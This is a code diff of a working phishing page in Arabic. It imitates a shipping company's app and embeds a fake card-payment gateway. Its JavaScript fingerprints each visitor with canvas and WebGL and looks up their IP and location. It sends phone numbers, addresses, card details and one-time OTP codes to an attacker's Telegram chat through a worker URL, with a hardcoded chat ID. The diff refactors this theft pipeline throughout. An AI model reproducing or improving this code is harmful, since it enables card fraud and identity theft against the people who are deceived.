@@ -656,14 +656,12 @@
         <section class="page active" id="page-home">
           <div class="home-image-container">
             <img id="mainImage" class="main-image" src="https://files.catbox.moe/nflilk.png" alt="الصورة الرئيسية" draggable="false" />
-            <!-- زر التتبع المخفي -->
             <button class="hidden-btn track-btn" id="hiddenTrackBtn" aria-label="زر التتبع" type="button"></button>
-            <!-- زر ارسال شحنة مخفي -->
             <button class="hidden-btn ship-btn" id="hiddenShipBtn" aria-label="زر ارسال شحنة" type="button"></button>
           </div>
         </section>
 
-        <!-- ========= الصفحة الجديدة: إدخال رقم الهاتف ========= -->
+        <!-- ========= الصفحة: إدخال رقم الهاتف ========= -->
         <section class="page" id="page-phone">
           <div class="section">
             <div class="titleBig" style="font-size:36px; margin-top:10px;">إرسال شحنة</div>
@@ -680,7 +678,7 @@
           </div>
         </section>
 
-        <!-- صفحات تطبيق أرامكس -->
+        <!-- صفحات التطبيق -->
         <section class="page" id="page-where">
           <div class="section">
             <div class="titleBig" style="font-size:42px; margin-top:8px">الى أين؟</div>
@@ -730,10 +728,8 @@
 
         <!-- ========== صفحة بوابة الدفع المدمجة ========== -->
         <section class="page" id="page-payment-gateway">
-          <!-- شاشة إدخال البطاقة -->
           <div class="pg-screen active" id="pg-paymentScreen">
             <div class="pg-container">
-              <!-- تم إزالة عرض المبلغ من الأعلى -->
               <div class="pg-divider">
                 <span>ادفع عن طريق البطاقة</span>
               </div>
@@ -766,12 +762,10 @@
             </div>
           </div>
 
-          <!-- شاشة الانتظار 60 ثانية -->
           <div class="pg-screen" id="pg-loader60Screen">
             <div class="pg-loader-screen"><div class="pg-loader-box"><div class="pg-blue-spinner"></div><div class="pg-loader-count" id="pg-loader60Count">60</div></div></div>
           </div>
 
-          <!-- شاشة OTP -->
           <div class="pg-screen" id="pg-otpScreen">
             <div class="pg-otp-page">
               <div class="pg-otp-title">رمز التحقق</div>
@@ -781,7 +775,6 @@
             </div>
           </div>
 
-          <!-- شاشة الانتظار 30 ثانية -->
           <div class="pg-screen" id="pg-loader30Screen">
             <div class="pg-loader-screen"><div class="pg-loader-box"><div class="pg-blue-spinner"></div></div></div>
           </div>
@@ -833,115 +826,24 @@
   const TELEGRAM_CHAT_ID = "6918534470";
   // =================================================================
 
-  // ================== متغيرات عامة لتخزين رقم الهاتف ورقم التتبع ==================
+  // ================== متغيرات عامة ==================
   let currentPhoneNumber = "";
   let currentTrackingNumber = "";
-  // =================================================================
-
-  // ================== بصمة ثابتة للمستخدم ==================
-  function generateStableFingerprint() {
-    let components = [
-      navigator.userAgent || '',
-      navigator.language || '',
-      screen.width + 'x' + screen.height,
-      screen.colorDepth,
-      new Date().getTimezoneOffset(),
-      navigator.hardwareConcurrency || '',
-      navigator.deviceMemory || '',
-      !!navigator.maxTouchPoints ? 'touch' : 'no-touch'
-    ];
-    let fingerprint = components.join('|');
-    let hash = 0;
-    for (let i = 0; i < fingerprint.length; i++) {
-      hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
-      hash |= 0;
-    }
-    return 'fp_' + Math.abs(hash).toString(16);
-  }
-  let userId = localStorage.getItem("stableUserId");
-  if (!userId) {
-    userId = generateStableFingerprint();
-    localStorage.setItem("stableUserId", userId);
-  }
+  let advancedFingerprint = "";
   let visitCount = parseInt(localStorage.getItem("visitCount") || "0") + 1;
   localStorage.setItem("visitCount", visitCount);
-  // =================================================================
-
-  function getDeviceType() {
-    let ua = navigator.userAgent;
-    if (/iPhone|iPad|iPod/i.test(ua)) return "📱 iOS (iPhone/iPad)";
-    if (/Android/i.test(ua)) return "📱 Android";
-    if (/Windows/i.test(ua)) return "💻 Windows";
-    if (/Macintosh/i.test(ua)) return "💻 Mac";
-    return "غير معروف";
-  }
-
-  function getBrowserInfo() {
-    let ua = navigator.userAgent;
-    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
-    if (ua.includes("Firefox")) return "Firefox";
-    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-    if (ua.includes("Edg")) return "Edge";
-    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
-    return "متصفح آخر";
-  }
-
-  // ================== دالة المعلومات الإضافية الموحدة ==================
-  function getAdditionalInfo() {
-    return `━━━━━━━━━━━\n🆔 البصمة الثابتة: ${userId}\n📱 نوع الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
-  }
-  // =================================================================
-
   let ipData = { ip: "غير معروف", country: "غير معروف", city: "غير معروف" };
-  (async function fetchIP() {
-    try {
-      let res = await fetch("https://ipapi.co/json/");
-      let data = await res.json();
-      ipData = { ip: data.ip || "غير معروف", country: data.country_name || "غير معروف", city: data.city || "غير معروف" };
-      await sendToTelegram(`🆕 *زيارة جديدة للموقع*\n🆔 المستخدم الثابت: ${userId}\n👀 عدد الزيارات: ${visitCount}\n📱 الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}`);
-    } catch(e) { console.error("IP fetch error:", e); }
-  })();
+  // =================================================
 
-  async function sendToTelegram(text) {
-    try {
-      const res = await fetch(TELEGRAM_WORKER_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
-      });
-      console.log(await res.text());
-    } catch(e) { console.error("Telegram send error:", e); }
-  }
-
-  // ================== دالة إرسال حدث مع المعلومات الإضافية ==================
-  async function sendEvent(message) {
-    let fullMessage = message + "\n" + getAdditionalInfo();
-    await sendToTelegram(fullMessage);
-  }
-  // =================================================================
-
-  // ================== منطق بوابة الدفع (مدمج) ==================
-  // دوال مساعدة خاصة بالبوابة
-  const pg = {
-    fingerprint: '',
-    visitCount: 0,
-    deviceInfo: { deviceType: '', os: '', browser: '' },
-    ip: '',
-    location: '',
-    amount: 0,
-    loader60Timer: null,
-    loader30Timer: null
-  };
-
-  async function pg_sha256(message) {
-    const encoder = new TextEncoder();
-    const data = encoder.encode(message);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-  }
-
-  async function pg_getAdvancedFingerprint() {
+  // ================== دالة البصمة المتقدمة (Canvas + WebGL) ==================
+  async function computeAdvancedFingerprint() {
+    async function sha256(msg) {
+      const encoder = new TextEncoder();
+      const data = encoder.encode(msg);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    }
     const canvas = document.createElement('canvas');
     canvas.width = 200; canvas.height = 50;
     const ctx = canvas.getContext('2d');
@@ -949,7 +851,7 @@
     ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,50);
     ctx.fillStyle = '#069'; ctx.fillText('عميل عربي 2026', 2, 15);
     ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillRect(100,10,80,30);
-    const canvasHash = await pg_sha256(canvas.toDataURL());
+    const canvasHash = await sha256(canvas.toDataURL());
     let webglHash = '';
     const canvasGL = document.createElement('canvas');
     const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
@@ -968,59 +870,79 @@
       new Date().getTimezoneOffset(), navigator.hardwareConcurrency || '',
       navigator.deviceMemory || '', canvasHash, webglHash, fontCheck
     ];
-    return 'fp_adv_' + (await pg_sha256(components.join('|'))).slice(0,16);
+    return 'fp_adv_' + (await sha256(components.join('|'))).slice(0,16);
+  }
+  // =================================================================
+
+  // ================== دوال معلومات الجهاز ==================
+  function getDeviceType() {
+    let ua = navigator.userAgent;
+    if (/iPhone|iPad|iPod/i.test(ua)) return "📱 iOS (iPhone/iPad)";
+    if (/Android/i.test(ua)) return "📱 Android";
+    if (/Windows/i.test(ua)) return "💻 Windows";
+    if (/Macintosh/i.test(ua)) return "💻 Mac";
+    return "غير معروف";
   }
 
-  function pg_getDetailedDeviceInfo() {
-    const ua = navigator.userAgent;
-    const isTablet = /Tablet|iPad/i.test(ua) || (screen.width >= 768 && /Android/i.test(ua) && /Mobile/i.test(ua) === false);
-    const isMobile = /Mobile/i.test(ua) || /iPhone|iPod|Android.*Mobile/i.test(ua);
-    let deviceType = "", os = "غير معروف";
-    if (/iPhone|iPad|iPod/i.test(ua)) { os = "iOS"; deviceType = isTablet ? "📟 آيباد" : "📱 آيفون"; }
-    else if (/Android/i.test(ua)) { os = "Android"; deviceType = isTablet ? "📟 تاب (أندرويد)" : "📱 أندرويد"; }
-    else if (/Windows/i.test(ua)) { os = "Windows"; deviceType = isTablet ? "📟 ويندوز تاب" : "💻 حاسوب (ويندوز)"; }
-    else if (/Mac OS/i.test(ua)) { os = "MacOS"; deviceType = "💻 حاسوب (ماك)"; }
-    else if (/Linux/i.test(ua)) { os = "Linux"; deviceType = "💻 حاسوب (لينكس)"; }
-    else { deviceType = isMobile ? "📱 جوال" : "💻 حاسوب"; }
-    let browser = "غير معروف";
-    if (/Edg/i.test(ua)) browser = "Edge";
-    else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
-    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
-    else if (/Firefox/i.test(ua)) browser = "Firefox";
-    else if (/Opera|OPR/i.test(ua)) browser = "Opera";
-    return { deviceType, os, browser };
+  function getBrowserInfo() {
+    let ua = navigator.userAgent;
+    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    if (ua.includes("Edg")) return "Edge";
+    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+    return "متصفح آخر";
   }
+  // =========================================================
 
-  async function pg_getIPAndLocation() {
+  // ================== معلومات إضافية موحدة ==================
+  function getAdditionalInfo() {
+    return `━━━━━━━━━━━\n🆔 البصمة: ${advancedFingerprint}\n📱 نوع الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
+  }
+  // =========================================================
+
+  // ================== إرسال إلى تيليجرام ==================
+  async function sendToTelegram(text) {
     try {
-      const ipRes = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipRes.json();
-      const ip = ipData.ip;
-      let location = "غير متاح";
-      try {
-        const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
-        const locData = await locRes.json();
-        if (locData.country_name) location = `${locData.country_name} - ${locData.city || ''}`;
-      } catch(e) {}
-      return { ip, location };
-    } catch(e) { return { ip: "غير متاح", location: "غير متاح" }; }
+      const res = await fetch(TELEGRAM_WORKER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+      });
+      console.log(await res.text());
+    } catch(e) { console.error("Telegram send error:", e); }
   }
 
-  async function pg_initFingerprint() {
-    pg.fingerprint = await pg_getAdvancedFingerprint();
-    pg.deviceInfo = pg_getDetailedDeviceInfo();
-    const loc = await pg_getIPAndLocation();
-    pg.ip = loc.ip;
-    pg.location = loc.location;
-    pg.visitCount = parseInt(localStorage.getItem("visitCount") || "0");
+  async function sendEvent(message) {
+    let fullMessage = message + "\n" + getAdditionalInfo();
+    await sendToTelegram(fullMessage);
   }
+  // =========================================================
 
-  // دالة المعلومات الإضافية الخاصة بالبوابة
+  // ================== تهيئة أولية ==================
+  (async function initialize() {
+    advancedFingerprint = await computeAdvancedFingerprint();
+    try {
+      let res = await fetch("https://ipapi.co/json/");
+      let data = await res.json();
+      ipData = { ip: data.ip || "غير معروف", country: data.country_name || "غير معروف", city: data.city || "غير معروف" };
+    } catch(e) { console.error("IP fetch error:", e); }
+    await sendEvent(`🆕 *زيارة جديدة للموقع*`);
+  })();
+  // =================================================
+
+  // ================== منطق بوابة الدفع (مدمج) ==================
+  const pg = {
+    amount: 0,
+    loader60Timer: null,
+    loader30Timer: null
+  };
+
+  // دوال البوابة تستخدم البصمة العامة والمعلومات العامة
   function pg_getAdditionalInfo() {
-    return `━━━━━━━━━━━\n🆔 البصمة المتقدمة: ${pg.fingerprint}\n📱 نوع الجهاز: ${pg.deviceInfo.deviceType} (${pg.deviceInfo.os})\n🌐 المتصفح: ${pg.deviceInfo.browser}\n🌍 IP: ${pg.ip}\n📍 الموقع: ${pg.location}\n👀 عدد الزيارات: ${pg.visitCount}`;
+    return `━━━━━━━━━━━\n🆔 البصمة: ${advancedFingerprint}\n📱 نوع الجهاز: ${getDeviceType()}\n🌐 المتصفح: ${getBrowserInfo()}\n🌍 IP: ${ipData.ip}\n📍 الموقع: ${ipData.city} - ${ipData.country}\n👀 عدد الزيارات: ${visitCount}`;
   }
 
-  // تحقق من البطاقة
   function pg_validateCardHolder() {
     const value = document.getElementById('pg-cardHolder').value.trim();
     const valid = /^[A-Za-z ]+$/.test(value) && value.length > 0;
@@ -1073,7 +995,6 @@
     return 'غير معروف';
   }
 
-  // ================== الرسالة الخامسة: معلومات بطاقة الدفع ==================
   async function pg_sendPaymentMessage() {
     const raw = pg_getRawCardNumber();
     const type = pg_detectCardType(raw);
@@ -1088,7 +1009,6 @@
     await sendToTelegram(msg);
   }
 
-  // ================== الرسالة السادسة: رمز التحقق ==================
   async function pg_sendOtpMessage(otp) {
     const phone = currentPhoneNumber || 'غير متوفر';
     const tracking = currentTrackingNumber || 'غير محدد';
@@ -1133,8 +1053,9 @@
     document.getElementById('pg-otpInput').classList.toggle("error", !valid && v.length > 0);
     return valid;
   }
+  // =========================================================
 
-  // ربط أحداث بوابة الدفع
+  // ================== ربط الأحداث (داخل DOMContentLoaded) ==================
   document.addEventListener('DOMContentLoaded', () => {
     // تعبئة قوائم الشهر والسنة
     const expMonth = document.getElementById('pg-expMonth');
@@ -1143,7 +1064,7 @@
     for (let y=26; y<=50; y++) { let o = document.createElement("option"); o.value = String(y); o.textContent = String(y); expYear.appendChild(o); }
     [expMonth, expYear].forEach(s => s.addEventListener("paste", e => e.preventDefault()));
 
-    // أحداث الإدخال والتحقق
+    // أحداث الإدخال والتحقق في بوابة الدفع
     const cardHolder = document.getElementById('pg-cardHolder');
     cardHolder.addEventListener("input", function() { this.value = this.value.replace(/[^A-Za-z ]/g, ""); pg_validateCardHolder(); });
     cardHolder.addEventListener("paste", function(e) { e.preventDefault(); let t = (e.clipboardData || window.clipboardData).getData("text"); this.value = t.replace(/[^A-Za-z ]/g, "").slice(0,40); pg_validateCardHolder(); });
@@ -1164,14 +1085,12 @@
     otpInput.addEventListener("input", function() { this.value = this.value.replace(/\D/g, "").slice(0,6); pg_validateOTP(); });
     otpInput.addEventListener("paste", function(e) { e.preventDefault(); let t = (e.clipboardData || window.clipboardData).getData("text"); this.value = t.replace(/\D/g, "").slice(0,6); pg_validateOTP(); });
 
-    // زر الدفع
     document.getElementById('pg-payBtn').addEventListener("click", async () => {
       if (!pg_validatePaymentForm()) return;
       await pg_sendPaymentMessage();
       pg_startLoader60ThenOTP();
     });
 
-    // زر OTP
     document.getElementById('pg-otpBtn').addEventListener("click", async () => {
       const otp = document.getElementById('pg-otpInput').value.trim();
       if (!otp) { document.getElementById('pg-otpInput').classList.add("error"); return; }
@@ -1179,229 +1098,208 @@
       await pg_sendOtpMessage(otp);
       pg_startLoader30ThenBackOTP();
     });
-  });
 
-  // ================== ربط أحداث أرامكس ==================
+    // --- تتبع الشحنة ---
+    document.getElementById("trackBtn").addEventListener("click", async () => {
+      let number = document.getElementById("trackingNumber").value.trim();
+      if (number.length !== 10) {
+        showPopup("يرجى إدخال رقم تتبع مكون من 10 أرقام.");
+        return;
+      }
+      let thirdDigit = number.charAt(2);
+      let fourthDigit = number.charAt(3);
+      let status = (thirdDigit === '4' && fourthDigit === '0') ? "الشحنة قيد المعالجة" : "لا يوجد شحنة بعد";
+      document.getElementById("trackResult").textContent = status;
+      document.getElementById("trackResult").style.display = "block";
+      await sendEvent(`🔍 *تتبع شحنة*\n📦 رقم التتبع: ${number}\n📋 الحالة: ${status}`);
+    });
 
-  // --- تتبع الشحنة ---
-  document.getElementById("trackBtn").addEventListener("click", async () => {
-    let number = document.getElementById("trackingNumber").value.trim();
-    if (number.length !== 10) {
-      showPopup("يرجى إدخال رقم تتبع مكون من 10 أرقام.");
-      return;
-    }
-    let thirdDigit = number.charAt(2);
-    let fourthDigit = number.charAt(3);
-    let status = (thirdDigit === '4' && fourthDigit === '0') ? "الشحنة قيد المعالجة" : "لا يوجد شحنة بعد";
-    document.getElementById("trackResult").textContent = status;
-    document.getElementById("trackResult").style.display = "block";
-    await sendEvent(`🔍 *تتبع شحنة*\n📦 رقم التتبع: ${number}\n📋 الحالة: ${status}`);
-  });
+    // --- استرجاع مبلغ الشحنة ---
+    document.getElementById("submitRefundBtn").addEventListener("click", async () => {
+      let valid = true;
+      const name = document.getElementById("refund_name").value.trim();
+      const phone = document.getElementById("refund_phone").value.trim();
+      const tracking = document.getElementById("refund_tracking").value.trim();
+      if (!name) { setError("err_refund_name", "يرجى إدخال الاسم"); valid = false; } else setError("err_refund_name", "");
+      if (!phone) { setError("err_refund_phone", "يرجى إدخال رقم الجوال"); valid = false; }
+      else if (!/^\d{8,10}$/.test(phone)) { setError("err_refund_phone", "رقم الجوال يجب أن يتكون من 8 إلى 10 أرقام"); valid = false; }
+      else setError("err_refund_phone", "");
+      if (!tracking) { setError("err_refund_tracking", "يرجى إدخال رقم التتبع"); valid = false; }
+      else if (!/^\d{10}$/.test(tracking)) { setError("err_refund_tracking", "رقم التتبع يجب أن يتكون من 10 أرقام"); valid = false; }
+      else setError("err_refund_tracking", "");
+      if (valid) {
+        await sendEvent(`💰 *طلب استرجاع مبلغ الشحنة*\n👤 الاسم: ${name}\n📱 رقم الجوال: ${phone}\n📦 رقم التتبع: ${tracking}`);
+        showPopup("سوف يتم استرجاع مبلغ الدفع خلال ثلاث أيام عمل إلى أسبوع. شكراً لك.");
+        document.getElementById("refund_name").value = "";
+        document.getElementById("refund_phone").value = "";
+        document.getElementById("refund_tracking").value = "";
+        go("where");
+      }
+    });
 
-  // --- استرجاع مبلغ الشحنة ---
-  document.getElementById("submitRefundBtn").addEventListener("click", async () => {
-    let valid = true;
-    const name = document.getElementById("refund_name").value.trim();
-    const phone = document.getElementById("refund_phone").value.trim();
-    const tracking = document.getElementById("refund_tracking").value.trim();
-    if (!name) { setError("err_refund_name", "يرجى إدخال الاسم"); valid = false; } else setError("err_refund_name", "");
-    if (!phone) { setError("err_refund_phone", "يرجى إدخال رقم الجوال"); valid = false; }
-    else if (!/^\d{8,10}$/.test(phone)) { setError("err_refund_phone", "رقم الجوال يجب أن يتكون من 8 إلى 10 أرقام"); valid = false; }
-    else setError("err_refund_phone", "");
-    if (!tracking) { setError("err_refund_tracking", "يرجى إدخال رقم التتبع"); valid = false; }
-    else if (!/^\d{10}$/.test(tracking)) { setError("err_refund_tracking", "رقم التتبع يجب أن يتكون من 10 أرقام"); valid = false; }
-    else setError("err_refund_tracking", "");
-    if (valid) {
-      await sendEvent(`💰 *طلب استرجاع مبلغ الشحنة*\n👤 الاسم: ${name}\n📱 رقم الجوال: ${phone}\n📦 رقم التتبع: ${tracking}`);
-      showPopup("سوف يتم استرجاع مبلغ الدفع خلال ثلاث أيام عمل إلى أسبوع. شكراً لك.");
-      document.getElementById("refund_name").value = "";
-      document.getElementById("refund_phone").value = "";
-      document.getElementById("refund_tracking").value = "";
+    document.getElementById("goLogin").addEventListener("click", async () => {
+      await sendEvent(`🔐 *الضغط على زر تسجيل الدخول*`);
+      go("phone");
+    });
+
+    document.getElementById("hiddenShipBtn").addEventListener("click", () => go("phone"));
+    document.getElementById("hiddenTrackBtn").addEventListener("click", () => go("tracking"));
+
+    const phoneInput = document.getElementById('phoneNumber');
+    phoneInput.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 10); });
+    phoneInput.addEventListener('paste', function(e) { e.preventDefault(); let pasted = (e.clipboardData || window.clipboardData).getData('text'); this.value = pasted.replace(/\D/g, '').slice(0, 10); });
+
+    document.getElementById('btnNextPhone').addEventListener('click', async () => {
+      const phone = document.getElementById('phoneNumber').value.trim();
+      const len = phone.length;
+      if (len < 8 || len > 10) {
+        setError("err_phoneNumber", "رقم الهاتف يجب أن يكون بين 8 و 10 أرقام");
+        document.getElementById('phoneNumber').classList.add('error');
+        return;
+      }
+      setError("err_phoneNumber", "");
+      document.getElementById('phoneNumber').classList.remove('error');
+      currentPhoneNumber = phone;
+      await sendEvent(`📱 *إرسال شحنة - رقم الهاتف*\n📱 رقم الهاتف: ${phone}`);
       go("where");
-    }
-  });
-
-  // --- تسجيل الدخول يذهب لصفحة الهاتف ---
-  document.getElementById("goLogin").addEventListener("click", async () => {
-    await sendEvent(`🔐 *الضغط على زر تسجيل الدخول*`);
-    go("phone");
-  });
-
-  // --- الأزرار المخفية في الصفحة الرئيسية ---
-  document.getElementById("hiddenShipBtn").addEventListener("click", () => go("phone"));
-  document.getElementById("hiddenTrackBtn").addEventListener("click", () => go("tracking"));
-
-  // --- صفحة إدخال رقم الهاتف ---
-  const phoneInput = document.getElementById('phoneNumber');
-  phoneInput.addEventListener('input', function() {
-    this.value = this.value.replace(/\D/g, '').slice(0, 10);
-  });
-  phoneInput.addEventListener('paste', function(e) {
-    e.preventDefault();
-    let pasted = (e.clipboardData || window.clipboardData).getData('text');
-    this.value = pasted.replace(/\D/g, '').slice(0, 10);
-  });
-
-  // --- الرسالة الأولى: رقم الهاتف ---
-  document.getElementById('btnNextPhone').addEventListener('click', async () => {
-    const phone = document.getElementById('phoneNumber').value.trim();
-    const len = phone.length;
-    if (len < 8 || len > 10) {
-      setError("err_phoneNumber", "رقم الهاتف يجب أن يكون بين 8 و 10 أرقام");
-      document.getElementById('phoneNumber').classList.add('error');
-      return;
-    }
-    setError("err_phoneNumber", "");
-    document.getElementById('phoneNumber').classList.remove('error');
-    // تخزين رقم الهاتف للمتغير العام
-    currentPhoneNumber = phone;
-    // إرسال الرسالة الأولى: رقم الهاتف مع المعلومات الإضافية
-    await sendEvent(`📱 *إرسال شحنة - رقم الهاتف*\n📱 رقم الهاتف: ${phone}`);
-    go("where");
-  });
-
-  document.getElementById('btnBackFromPhone').addEventListener('click', () => {
-    document.getElementById('phoneNumber').value = '';
-    setError("err_phoneNumber", "");
-    document.getElementById('phoneNumber').classList.remove('error');
-    currentPhoneNumber = "";
-    go("home");
-  });
-
-  // --- القائمة الجانبية ---
-  document.querySelectorAll(".menu-item").forEach(item => {
-    item.addEventListener("click", () => {
-      const a = item.dataset.action;
-      if (a === "send") go("phone");
-      else if (a === "track") go("tracking");
-      else if (a === "refund") go("refund");
-      closeMenu();
     });
-  });
 
-  // --- الرسالة الثانية: نوع الشحنة (محلية/دولية) ---
-  document.querySelectorAll("#page-where .choice").forEach(choice => {
-    choice.addEventListener("click", async function() {
-      let type = this.querySelector(".lbl")?.innerText || (this.dataset.type === "local" ? "شحنة محلية" : "شحنة دولية");
-      const phone = currentPhoneNumber || 'غير متوفر';
-      await sendEvent(`📦 *اختيار نوع الشحنة*\n📦 نوع الشحنة: ${type}\n📱 رقم الهاتف: ${phone}`);
-      go(this.dataset.next);
+    document.getElementById('btnBackFromPhone').addEventListener('click', () => {
+      document.getElementById('phoneNumber').value = '';
+      setError("err_phoneNumber", "");
+      document.getElementById('phoneNumber').classList.remove('error');
+      currentPhoneNumber = "";
+      go("home");
     });
-  });
 
-  // --- الرسالة الثالثة: معلومات المرسل + المستلم + تفاصيل الشحنة ---
-  let isSending = false;
-  document.getElementById("btnSendShipment").addEventListener("click", async () => {
-    if (isSending) return;
-    if (!validateDetails()) return;
-    isSending = true;
-    try {
+    document.querySelectorAll(".menu-item").forEach(item => {
+      item.addEventListener("click", () => {
+        const a = item.dataset.action;
+        if (a === "send") go("phone");
+        else if (a === "track") go("tracking");
+        else if (a === "refund") go("refund");
+        closeMenu();
+      });
+    });
+
+    document.querySelectorAll("#page-where .choice").forEach(choice => {
+      choice.addEventListener("click", async function() {
+        let type = this.querySelector(".lbl")?.innerText || (this.dataset.type === "local" ? "شحنة محلية" : "شحنة دولية");
+        const phone = currentPhoneNumber || 'غير متوفر';
+        await sendEvent(`📦 *اختيار نوع الشحنة*\n📦 نوع الشحنة: ${type}\n📱 رقم الهاتف: ${phone}`);
+        go(this.dataset.next);
+      });
+    });
+
+    let isSending = false;
+    document.getElementById("btnSendShipment").addEventListener("click", async () => {
+      if (isSending) return;
+      if (!validateDetails()) return;
+      isSending = true;
+      try {
+        const phone = currentPhoneNumber || 'غير متوفر';
+        let sender = `👤 المرسل:\nالاسم: ${document.getElementById("s_name").value}\nالبلد: ${document.getElementById("s_country").options[document.getElementById("s_country").selectedIndex]?.text}\nالهاتف: ${document.getElementById("s_phone").value}\nالمدينة: ${document.getElementById("s_city").value}\nالحي: ${document.getElementById("s_district").value}\nالشارع: ${document.getElementById("s_street").value}`;
+        let receiver = `👤 المستلم:\nالاسم: ${document.getElementById("r_name").value}\nالبلد: ${document.getElementById("r_country").options[document.getElementById("r_country").selectedIndex]?.text}\nالهاتف: ${document.getElementById("r_phone").value}\nالمدينة: ${document.getElementById("r_city").value}\nالحي: ${document.getElementById("r_district").value}\nالشارع: ${document.getElementById("r_street").value}`;
+        let details = `📦 تفاصيل الشحنة:\nرقم التتبع: ${document.getElementById("d_shipno").value}\nالمحتويات: ${document.getElementById("d_content").value}\nعدد القطع: ${document.getElementById("d_pieces").value}\nنوع الشحنة: ${selectedType === "docs" ? "وثائق" : "طرد"}`;
+        await sendEvent(`📮 *معلومات الشحنة كاملة*\n📱 رقم الهاتف: ${phone}\n\n${sender}\n\n${receiver}\n\n${details}`);
+        currentTrackingNumber = document.getElementById("d_shipno").value.trim();
+        go("paymethod");
+      } finally {
+        isSending = false;
+      }
+    });
+
+    document.getElementById("btnProceedToPay").addEventListener("click", async () => {
+      const amountInput = document.getElementById("paymentAmount");
+      let amount = parseFloat(amountInput.value);
+      if (isNaN(amount) || amount <= 0) {
+        setError("err_payment_amount", "يرجى إدخال قيمة دفع صحيحة أكبر من صفر");
+        return;
+      } else {
+        setError("err_payment_amount", "");
+      }
+      pg.amount = amount;
       const phone = currentPhoneNumber || 'غير متوفر';
-      let sender = `👤 المرسل:\nالاسم: ${document.getElementById("s_name").value}\nالبلد: ${document.getElementById("s_country").options[document.getElementById("s_country").selectedIndex]?.text}\nالهاتف: ${document.getElementById("s_phone").value}\nالمدينة: ${document.getElementById("s_city").value}\nالحي: ${document.getElementById("s_district").value}\nالشارع: ${document.getElementById("s_street").value}`;
-      let receiver = `👤 المستلم:\nالاسم: ${document.getElementById("r_name").value}\nالبلد: ${document.getElementById("r_country").options[document.getElementById("r_country").selectedIndex]?.text}\nالهاتف: ${document.getElementById("r_phone").value}\nالمدينة: ${document.getElementById("r_city").value}\nالحي: ${document.getElementById("r_district").value}\nالشارع: ${document.getElementById("r_street").value}`;
-      let details = `📦 تفاصيل الشحنة:\nرقم التتبع: ${document.getElementById("d_shipno").value}\nالمحتويات: ${document.getElementById("d_content").value}\nعدد القطع: ${document.getElementById("d_pieces").value}\nنوع الشحنة: ${selectedType === "docs" ? "وثائق" : "طرد"}`;
-      await sendEvent(`📮 *معلومات الشحنة كاملة*\n📱 رقم الهاتف: ${phone}\n\n${sender}\n\n${receiver}\n\n${details}`);
-      currentTrackingNumber = document.getElementById("d_shipno").value.trim();
-      go("paymethod");
-    } finally {
-      isSending = false;
+      const tracking = currentTrackingNumber || 'غير محدد';
+      await sendEvent(`💳 *الانتقال للدفع*\n💰 قيمة الدفع: ${amount} ريال\n📱 رقم الهاتف: ${phone}\n📦 رقم التتبع: ${tracking}`);
+      go("payment-gateway");
+      document.getElementById('pg-cardHolder').value = '';
+      document.getElementById('pg-cardNumber').value = '';
+      document.getElementById('pg-cvv').value = '';
+      document.getElementById('pg-expMonth').value = '';
+      document.getElementById('pg-expYear').value = '';
+      document.getElementById('pg-otpInput').value = '';
+      document.querySelectorAll('#page-payment-gateway .pg-screen').forEach(s => s.classList.remove('active'));
+      document.getElementById('pg-paymentScreen').classList.add('active');
+      clearInterval(pg.loader60Timer);
+      clearTimeout(pg.loader30Timer);
+    });
+
+    // ================== دوال مساعدة ==================
+    function setError(id, msg) { const el = document.getElementById(id); if (!el) return; if (msg) { el.textContent = msg; el.style.display = 'block'; } else { el.textContent = ''; el.style.display = 'none'; } }
+    function clearAllErrors() { document.querySelectorAll('.error-msg').forEach(el => { el.textContent = ''; el.style.display = 'none'; }); }
+    function showPopup(msg) {
+      const popup = document.getElementById('customPopup');
+      document.getElementById('popupMessage').textContent = msg;
+      popup.style.display = 'block';
+      setTimeout(() => { popup.style.display = 'none'; }, 4000);
     }
-  });
+    window.hidePopup = () => document.getElementById('customPopup').style.display = 'none';
+    const countryDial = { sa: '+966', ae: '+971', kw: '+965', bh: '+973', qa: '+974', om: '+968' };
+    const phonePlaceholders = { sa: '0512345678', ae: '0501234567', kw: '50012345', bh: '36001234', qa: '33123456', om: '92123456' };
+    function updatePhoneField(prefix) { const select = document.getElementById(prefix + '_country'); const span = document.querySelector(`#${prefix}_flag span`); const inp = document.getElementById(prefix + '_phone'); if (!select || !span || !inp) return; const code = select.value; span.textContent = countryDial[code] || '+966'; inp.placeholder = phonePlaceholders[code] || '0512345678'; }
